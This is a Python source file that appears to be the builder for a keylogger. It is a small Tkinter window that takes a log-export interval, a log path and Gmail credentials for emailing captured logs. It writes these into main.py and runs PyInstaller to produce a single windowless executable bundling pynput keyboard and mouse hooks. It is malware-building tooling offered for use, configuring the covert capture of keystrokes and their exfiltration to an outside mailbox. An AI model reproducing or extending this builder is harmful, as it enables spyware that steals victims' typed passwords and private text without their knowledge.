import os
import site
import sys
from tkinter import *
from tkinter import messagebox

os.chdir(os.path.dirname(os.path.abspath(__file__)))


def save_file(constructor):
    match_line = "if __name__ == \"__main__\":"
    new_line = f"{match_line}\n{4 * ' '}Main{constructor}.start()"

    i = 0
    file = open("main.py", "r")
    file_contents = file.readlines()
    file.close()

    for i in range(0, len(file_contents)):
        if file_contents[i][0:len(match_line)] == match_line:
            break

    file_contents = file_contents[:i]
    file_contents.append(new_line)

    file = open("main.py", "w")
    file.writelines(file_contents)
    file.close()


def get_pyinstaller():
    user_path = site.getusersitepackages().split("\\")[:-1]
    user_path = "\\".join(user_path)

    for path in site.getsitepackages() + [site.getusersitepackages(), user_path]:
        _path = f"{path}\\Scripts\\pyinstaller.exe"
        if os.path.isfile(_path):
            return "\"" + _path + "\""

    messagebox.showerror("Error", "Pyinstaller not found in any site packages.")
    sys.exit(0)


class Setup:
    def __init__(self, ):
        self.use_gmail = False

    def create_ui(self, title, x, y):
        self.root = Tk()
        self.root.geometry(f"{x}x{y}")
        self.root.resizable(0, 0)
        self.root.title(title)

        self.txt_time = Entry(self.root, bd=3)
        Label(self.root, text="Export logs interval (s)").pack()
        self.txt_time.insert(END, "60")
        self.txt_time.pack()

        self.txt_export = Entry(self.root, bd=3)
        Label(self.root, text="Path to log export").pack()
        self.txt_export.insert(END, "%userprofile%\\log.txt")
        self.txt_export.pack()

        self.lb_frame = LabelFrame(self.root, text="Gmail export")
        self.lb_frame.pack()

        self.txt_username = Entry(self.lb_frame, bd=3)
        Label(self.lb_frame, text="Gmail username").pack()
        self.txt_username.insert(END, "email@gmail.com")
        self.txt_username.pack()

        self.txt_pass = Entry(self.lb_frame, bd=3)
        Label(self.lb_frame, text="Gmail password").pack()
        self.txt_pass.insert(END, "password")
        self.txt_pass.pack()

        self.lb_frame2 = LabelFrame(self.root, text="Optional config")
        self.lb_frame2.pack()

        self.btn_use_gmail = Button(self.lb_frame2, text="Use Gmail export", width=16, bd=4, command=self.on_click_use_gmail)
        self.btn_use_gmail.pack()

        self.btn_build = Button(self.root, text="Build", width=28, bd=4, command=self.on_click_build)
        self.btn_build.pack(side=BOTTOM)

        self.root.mainloop()

    def on_click_use_gmail(self):
        self.btn_use_gmail.configure(state="disabled")
        self.use_gmail = True

    def on_click_build(self):
        self.root.withdraw()

        constructor_args = f"({self.txt_time.get()}, \"{self.txt_export.get()}\""

        if self.use_gmail:
            constructor_args += f", \"{self.txt_username.get()}\", \"{self.txt_pass.get()}\""

        constructor_args += ")"

        save_file(constructor_args)

        os.system(f"{get_pyinstaller()} main.py --onefile --windowed -y --clean --hidden-import "
                  f"pynput.keyboard._win32 --hidden-import pynput.mouse._win32 --exclude-module FixTk "
                  f"--exclude-module tcl --exclude-module tk --exclude-module _tkinter --exclude-module tkinter "
                  f"--exclude-module Tkinter")

        messagebox.showinfo("Build", "Finished!")

        self.root.destroy()


if __name__ == "__main__":
    Setup().create_ui("Setup", 200, 280)
